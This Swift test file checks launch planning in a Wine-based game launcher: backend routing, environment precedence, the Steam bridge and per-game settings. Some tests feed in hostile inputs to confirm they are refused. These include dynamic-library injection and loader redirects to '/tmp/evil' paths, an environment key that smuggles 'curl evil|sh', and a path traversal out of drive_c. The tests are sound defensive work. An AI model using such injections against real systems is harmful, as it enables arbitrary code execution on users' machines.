import Foundation
import Testing
@testable import Fable

/// Locks the launch-routing core: backend → wine binary / runtime key /
/// wineserver drain, and the environment-composition precedence. This is the
/// most load-bearing function in the app; a stub resolver + temp prefix let us
/// pin the whole table without real Wine installs.
@MainActor
@Suite struct LaunchPlanTests {
    private let fm = FileManager.default

    /// Fixed binaries per backend family, so routing is observable.
    @MainActor
    private struct StubRuntime: RuntimeResolving {
        func wineBinary(for backend: GraphicsBackend) throws -> URL {
            switch backend {
            case .gptk: URL(filePath: "/stub/gptk/bin/wine64")
            case .crossover: URL(filePath: "/stub/crossover/bin/wine")
            case .sikarugir: URL(filePath: "/stub/sikarugir/wswine.bundle/bin/wine64")
            case .off, .dxmt, .dxvk: URL(filePath: "/stub/wine/bin/wine64")
            }
        }
        func wineserverBinary(for backend: GraphicsBackend) -> URL? {
            switch backend {
            case .gptk, .crossover, .sikarugir:
                URL(filePath: "/stub/\(backend.rawValue)/wineserver")
            case .off, .dxmt, .dxvk:
                nil
            }
        }
        /// Explicit, so no test depends on this Mac's real bridge folder.
        var bridge: Result<URL, GameLaunchError> = .failure(.steamBridgeNotReady("not built"))
        func steamBridge() -> Result<URL, GameLaunchError> { bridge }
    }

    /// Temp prefix with a drive_c and a fake game exe.
    private func makePrefix(exe: String = "Games/Demo/demo.exe") throws -> (prefix: URL, driveC: URL) {
        let prefix = fm.temporaryDirectory.appending(path: "plan-\(UUID().uuidString)", directoryHint: .isDirectory)
        let driveC = prefix.appending(path: "drive_c", directoryHint: .isDirectory)
        let exeURL = driveC.appending(path: exe)
        try fm.createDirectory(at: exeURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("MZ".utf8).write(to: exeURL)
        return (prefix, driveC)
    }

    private func plan(
        game: Game,
        bottle: Bottle,
        prefix: URL,
        driveC: URL,
        base: [String: String] = ["WINEDLLOVERRIDES": "mscoree,mshtml="],
        runtime: StubRuntime = StubRuntime()
    ) throws -> GameLauncher.LaunchPlan {
        try GameLauncher.composeLaunchPlan(
            game: game, bottle: bottle, prefix: prefix, driveC: driveC,
            baseEnvironment: base,
            logFile: fm.temporaryDirectory.appending(path: "plan-test.log"),
            runtime: runtime
        )
    }

    /// The files staging copies out of a bridge build.
    private func makeBridge() throws -> URL {
        let bridge = fm.temporaryDirectory.appending(path: "bridge-\(UUID().uuidString)", directoryHint: .isDirectory)
        for path in ["steam.exe", "x86_64-windows/steamclient64.dll", "i386-windows/steamclient.dll"] {
            let url = bridge.appending(path: path)
            try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(path.utf8).write(to: url)
        }
        return bridge
    }

    // MARK: Native Steam bridge

    @Test
    func bridgeGameLaunchesThroughTheStandIn() throws {
        let (prefix, driveC) = try makePrefix()
        let bridge = try makeBridge()
        defer { try? fm.removeItem(at: prefix); try? fm.removeItem(at: bridge) }
        let game = Game(name: "D", executablePath: "Games/Demo/demo.exe", arguments: "-windowed",
                        environment: ["SteamAppId": "999", "DXVK_HUD": "fps"], steamAppID: 1168880)
        var runtime = StubRuntime()
        runtime.bridge = .success(bridge)

        let plan = try plan(game: game, bottle: Bottle(name: "B", graphicsBackend: .sikarugir),
                            prefix: prefix, driveC: driveC, runtime: runtime)

        // Wine runs the stand-in from the bridge's own folder in the bottle…
        #expect(plan.executable == driveC.appending(path: "\(SteamBridge.prefixFolder)/steam.exe"))
        #expect(fm.fileExists(atPath: plan.executable.path))
        // …which gets the game as a C: path, then the game's own arguments.
        #expect(plan.wineArguments.dropFirst() == [#"C:\Games\Demo\demo.exe"#, "-windowed"])
        // The game still starts in its own folder.
        #expect(plan.workingDirectory.standardizedFileURL.path(percentEncoded: false)
                == driveC.appending(path: "Games/Demo/").standardizedFileURL.path(percentEncoded: false))
        // Bridge variables are set and can't be overridden per game.
        #expect(plan.environment["WINEDLLPATH"] == bridge.path)
        #expect(plan.environment["SteamAppId"] == "1168880")
        #expect(plan.environment["SteamGameId"] == "1168880")
        #expect(plan.environment["STEAM_COMPAT_CLIENT_INSTALL_PATH"]?
            .hasSuffix("Steam.AppBundle/Steam/Contents/MacOS") == true)
        #expect(plan.environment["DXVK_HUD"] == "fps")              // other per-game settings still apply
        #expect(plan.runtimeKey == "sikarugir")
    }

    @Test
    func bridgeNeedsSikarugir() throws {
        let (prefix, driveC) = try makePrefix()
        let bridge = try makeBridge()
        defer { try? fm.removeItem(at: prefix); try? fm.removeItem(at: bridge) }
        var runtime = StubRuntime()
        runtime.bridge = .success(bridge)
        let game = Game(name: "D", executablePath: "Games/Demo/demo.exe", steamAppID: 480)
        do {
            _ = try plan(game: game, bottle: Bottle(name: "B", graphicsBackend: .dxvk),
                         prefix: prefix, driveC: driveC, runtime: runtime)
            Issue.record("planned a bridge launch off Sikarugir")
        } catch GameLaunchError.steamBridgeNeedsSikarugir {
        } catch {
            Issue.record("expected .steamBridgeNeedsSikarugir, got \(error)")
        }
    }

    @Test
    func bridgeGameWithoutABuildSaysSo() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let game = Game(name: "D", executablePath: "Games/Demo/demo.exe", steamAppID: 480)
        do {
            _ = try plan(game: game, bottle: Bottle(name: "B", graphicsBackend: .sikarugir),
                         prefix: prefix, driveC: driveC)
            Issue.record("planned a bridge launch with no bridge")
        } catch GameLaunchError.steamBridgeNotReady {
        } catch {
            Issue.record("expected .steamBridgeNotReady, got \(error)")
        }
    }

    @Test
    func ordinaryGamesDontTouchTheBridge() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let plan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                            bottle: Bottle(name: "B", graphicsBackend: .sikarugir), prefix: prefix, driveC: driveC)
        #expect(plan.executable == driveC.appending(path: "Games/Demo/demo.exe"))
        #expect(plan.environment["WINEDLLPATH"] == nil)
        #expect(plan.environment["SteamAppId"] == nil)
        #expect(!fm.fileExists(atPath: driveC.appending(path: SteamBridge.prefixFolder).path))
    }

    @Test
    func steamAppIDSurvivesAndOlderGamesDecodeWithoutIt() throws {
        let game = Game(name: "D", executablePath: "x.exe", steamAppID: 1168880)
        let decoded = try JSONDecoder().decode(Game.self, from: JSONEncoder().encode(game))
        #expect(decoded.steamAppID == 1168880)
        let old = #"{"id":"6F9619FF-8B86-D011-B42D-00C04FC964FF","name":"D","executablePath":"x.exe"}"#
        #expect(try JSONDecoder().decode(Game.self, from: Data(old.utf8)).steamAppID == nil)
    }

    // MARK: Routing table

    @Test
    func routesEveryBackendToItsRuntime() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let game = Game(name: "Demo", executablePath: "Games/Demo/demo.exe")

        let expected: [(GraphicsBackend, String, String, Bool)] = [
            (.off, "/stub/wine/bin/wine64", "wine", false),
            (.dxmt, "/stub/wine/bin/wine64", "wine", false),
            (.dxvk, "/stub/wine/bin/wine64", "wine", false),
            (.gptk, "/stub/gptk/bin/wine64", "gptk", true),
            (.crossover, "/stub/crossover/bin/wine", "crossover", true),
            (.sikarugir, "/stub/sikarugir/wswine.bundle/bin/wine64", "sikarugir", true),
        ]
        for (backend, binary, key, drains) in expected {
            let bottle = Bottle(name: "B", graphicsBackend: backend)
            let plan = try plan(game: game, bottle: bottle, prefix: prefix, driveC: driveC)
            #expect(plan.wine.path == binary, "\(backend) wine binary")
            #expect(plan.runtimeKey == key, "\(backend) runtime key")
            #expect((plan.releaseWineserver != nil) == drains, "\(backend) wineserver drain")
        }
    }

    @Test
    func perGameBackendOverrideWinsOverBottle() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let game = Game(name: "D", executablePath: "Games/Demo/demo.exe", graphicsBackend: .sikarugir)
        let bottle = Bottle(name: "B", graphicsBackend: .off)
        let plan = try plan(game: game, bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(plan.runtimeKey == "sikarugir")
    }

    @Test
    func missingExecutableThrows() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let ghost = Game(name: "G", executablePath: "Games/Nope/ghost.exe")
        #expect(throws: (any Error).self) {
            try plan(game: ghost, bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC)
        }
    }

    @Test
    func executablePathCannotLeaveDriveC() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        // A real file just outside drive_c, reached by a bottle.json path
        // that never went through the add-game check.
        try Data("#!/bin/sh".utf8).write(to: prefix.appending(path: "outside.sh"))
        let escapee = Game(name: "E", executablePath: "Games/../../outside.sh")
        do {
            _ = try plan(game: escapee, bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC)
            Issue.record("planned a launch outside drive_c")
        } catch GameLaunchError.executableOutsideBottle {
        } catch {
            Issue.record("expected .executableOutsideBottle, got \(error)")
        }
        // `..` that stays inside drive_c is still fine.
        let inside = Game(name: "I", executablePath: "Games/Demo/../Demo/demo.exe")
        #expect(throws: Never.self) {
            try plan(game: inside, bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC)
        }
    }

    // MARK: Environment composition

    @Test
    func environmentPrecedenceIsBaseThenBackendThenPerformanceThenGame() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        var bottle = Bottle(name: "B", graphicsBackend: .dxvk)
        bottle.performance = PerformanceOptions(metalHUD: true, metalFXUpscaling: false, frameRateCap: 60)
        // Per-game env must beat both the backend layer (DXVK_FRAME_RATE from
        // the cap) and the base layer (FROM_BASE).
        let game = Game(
            name: "D", executablePath: "Games/Demo/demo.exe",
            environment: ["DXVK_FRAME_RATE": "30", "FROM_BASE": "game-wins"]
        )
        let plan = try plan(
            game: game, bottle: bottle, prefix: prefix, driveC: driveC,
            base: ["WINEDLLOVERRIDES": "mscoree,mshtml=", "FROM_BASE": "base"]
        )
        #expect(plan.environment["DXVK_FRAME_RATE"] == "30")           // game > backend
        #expect(plan.environment["FROM_BASE"] == "game-wins")          // game > base
        #expect(plan.environment["MTL_HUD_ENABLED"] == "1")            // performance layer applied
        #expect(plan.environment["WINEDEBUG"] == WineEnv.debugDiagnostic)
        // Base overrides are preserved as the prefix of the backend's routing.
        #expect(plan.environment["WINEDLLOVERRIDES"]?.hasPrefix("mscoree,mshtml=") == true)
    }

    @Test
    func perGameOverridesCannotRedirectTheNativeLoader() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        // What a shared .fbottle's bottle.json could carry for a game.
        let game = Game(
            name: "D", executablePath: "Games/Demo/demo.exe",
            environment: [
                "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
                "dyld_library_path": "/tmp",
                "WINELOADER": "/tmp/evil",
                "WINESERVER": "/tmp/evil",
                "WINEDLLPATH": "/tmp/evil",
                "X=1;curl evil|sh;Y": "1",
                "DXVK_HUD": "fps",                     // ordinary tuning still applies
            ]
        )
        let plan = try plan(game: game, bottle: Bottle(name: "B", graphicsBackend: .dxvk),
                            prefix: prefix, driveC: driveC)

        for refused in ["DYLD_INSERT_LIBRARIES", "dyld_library_path", "WINELOADER",
                        "WINESERVER", "WINEDLLPATH", "X=1;curl evil|sh;Y"] {
            #expect(plan.environment[refused] == nil, Comment(rawValue: refused))
            #expect(plan.refusedEnvironmentKeys.contains(refused), Comment(rawValue: refused))
        }
        #expect(plan.environment["DXVK_HUD"] == "fps")
        #expect(plan.refusedEnvironmentKeys == plan.refusedEnvironmentKeys.sorted())
    }

    @Test
    func screeningOnlyTouchesThePerGameLayer() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        // Fable's own layers may set loader variables (Winetricks sets
        // WINESERVER today); the screen must not strip those.
        let plan = try plan(
            game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
            bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC,
            base: ["WINEDLLOVERRIDES": "mscoree,mshtml=", "WINESERVER": "/fable/wineserver"]
        )
        #expect(plan.environment["WINESERVER"] == "/fable/wineserver")
        #expect(plan.refusedEnvironmentKeys.isEmpty)
    }

    @Test
    func screenedOverridesRules() {
        let (applied, refused) = WineEnv.screenedOverrides([
            "MTL_HUD_ENABLED": "1", "_PRIVATE2": "x",
            "DYLD_FALLBACK_LIBRARY_PATH": "/x", "2BAD": "x", "": "x", "A B": "x",
        ])
        #expect(applied == ["MTL_HUD_ENABLED": "1", "_PRIVATE2": "x"])
        #expect(refused == ["", "2BAD", "A B", "DYLD_FALLBACK_LIBRARY_PATH"])
    }

    @Test
    func dxvkRoutesDLLsNativeAndCarriesTheCap() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        var bottle = Bottle(name: "B", graphicsBackend: .dxvk)
        bottle.performance.frameRateCap = 72
        let plan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                            bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(plan.environment["DXVK_FRAME_RATE"] == "72")
        #expect(plan.environment["WINEDLLOVERRIDES"]?.hasSuffix("=n") == true)
        // Memory Diet: the hardware-sized VRAM cap is written into the prefix
        // and wired via DXVK_CONFIG_FILE.
        let conf = prefix.appending(path: DXVKManager.memoryDietConfigName)
        #expect(plan.environment["DXVK_CONFIG_FILE"] == conf.path)
        let content = try String(contentsOf: conf, encoding: .utf8)
        #expect(content.contains("dxgi.maxDeviceMemory = "))
    }

    @Test
    func dxvkMemoryDietYieldsToPerGameOverride() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let bottle = Bottle(name: "B", graphicsBackend: .dxvk)
        var game = Game(name: "D", executablePath: "Games/Demo/demo.exe")
        game.environment = ["DXVK_CONFIG_FILE": "/dev/null"]
        let plan = try plan(game: game, bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(plan.environment["DXVK_CONFIG_FILE"] == "/dev/null")
    }

    @Test
    func dxmtThreadsTheFrameCapIntoItsConfig() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        var bottle = Bottle(name: "B", graphicsBackend: .dxmt)
        bottle.performance.frameRateCap = 90
        let dxmtPlan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                                bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(dxmtPlan.environment["DXMT_CONFIG"]?.contains("dxgi.maxFrameRate=90") == true)
        #expect(dxmtPlan.environment["WINEDLLOVERRIDES"]?.hasSuffix("=n") == true)

        // .off keeps the same wine but routes the DLLs back to builtin.
        var offBottle = bottle
        offBottle.graphicsBackend = .off
        let offPlan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                               bottle: offBottle, prefix: prefix, driveC: driveC)
        #expect(offPlan.environment["DXMT_CONFIG"] == nil)
        #expect(offPlan.environment["WINEDLLOVERRIDES"]?.hasSuffix("=b") == true)
    }

    @Test
    func sikarugirForcesBuiltinsAndMsync() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        var bottle = Bottle(name: "B", graphicsBackend: .sikarugir)
        bottle.performance = PerformanceOptions(metalHUD: false, metalFXUpscaling: true, frameRateCap: 60)
        let plan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                            bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(plan.environment["WINEMSYNC"] == "1")
        #expect(plan.environment["WINEDLLOVERRIDES"]?.contains("d3d11,d3d12,dxgi,nvapi64=b") == true)
        // D3DMetal perf knobs ride along on the D3DMetal-family backends.
        #expect(plan.environment["D3DM_MAX_FPS"] == "60")
        #expect(plan.environment["D3DM_ENABLE_METALFX"] == "1")
    }

    @Test
    func crossoverGetsBottleIdentityAndConfigFile() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let bottle = Bottle(name: "B", graphicsBackend: .crossover)
        let plan = try plan(game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
                            bottle: bottle, prefix: prefix, driveC: driveC)
        #expect(plan.environment["CX_BOTTLE"] == prefix.lastPathComponent)
        #expect(plan.environment["CX_BOTTLE_PATH"] == prefix.deletingLastPathComponent().path)
        // The wrapper refuses a bottle without cxbottle.conf — must be written.
        #expect(fm.fileExists(atPath: prefix.appending(path: "cxbottle.conf").path))
    }

    @Test
    func argumentsAndWorkingDirectoryComposeCorrectly() throws {
        let (prefix, driveC) = try makePrefix()
        defer { try? fm.removeItem(at: prefix) }
        let game = Game(name: "D", executablePath: "Games/Demo/demo.exe",
                        arguments: "-windowed \"two words\"")
        let plan = try plan(game: game, bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC)
        #expect(plan.wineArguments.first?.hasSuffix("Games/Demo/demo.exe") == true)
        #expect(plan.wineArguments.dropFirst() == ["-windowed", "two words"])
        #expect(plan.workingDirectory == plan.executable.deletingLastPathComponent())
    }

    // MARK: Steam-prerequisite detection

    @Test
    func steamGamesNeedTheClientButSteamItselfDoesNot() {
        let steamGame = Game(name: "DL", executablePath: "Program Files (x86)/Steam/steamapps/common/DEATHLOOP/DEATHLOOP.exe")
        let steamClient = Game(name: "Steam", executablePath: "Program Files (x86)/Steam/steam.exe")
        let standalone = Game(name: "SS2", executablePath: "Games/SS2/ss2.exe")
        #expect(GameLauncher.needsSteamRunning(steamGame))
        #expect(!GameLauncher.needsSteamRunning(steamClient))
        #expect(!GameLauncher.needsSteamRunning(standalone))
    }
}
